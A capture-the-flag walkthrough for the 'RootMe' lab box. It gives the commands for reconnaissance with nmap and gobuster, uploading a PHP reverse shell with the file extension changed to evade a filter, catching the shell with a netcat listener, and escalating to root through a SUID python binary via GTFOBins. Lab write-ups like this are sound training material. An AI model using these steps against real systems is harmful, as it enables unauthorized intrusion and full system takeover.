
## **RootMe**

```
nmap -sC -sV --vv <IP>
```

```
gobuster dir -u <url> -w <wordlist>
```

We found  /uploads and /panel

/panel is hidden directory

##### **User.txt**

Let’s search in uploads file on the web

Panel has file upload option so we can use pentest monkey reverse shell

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Download this file and change ip to tun0 IP of your pc and port too (We normally use default 1234 port)

```
nc -lvnp port
```

Upload php file in it

We found that we are not able to enter php file directly

Change extension from php to php5

```
mv <filename>.php <newname>.php5
```

Now upload again

We were able to bypass that

Let’s go to /uploads folder as it is where we uploaded our file

Click on reverse shell over there

We got reverse shell 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


We have user access and a stable shell

```
find / -name user.txt 2>/dev/null
```

We found file inside /var/www/user.txt

##### **Privilege Escalation**

```
find / -perm -u=s 2>/dev/null
```

-u=s -> means that we are finding a file where we have super user aka root permissions

2>/dev/null à Used to scrap results of permission denied ones

We can do something about

/usr/bin/python

Apart from /python one others are mostly there

Let’s go to gtfobins

Search python and click on suid

[https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)

```
cd /usr/bin
```

```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

/usr/bin is where the python is there

Now we are root and we can cat out root flag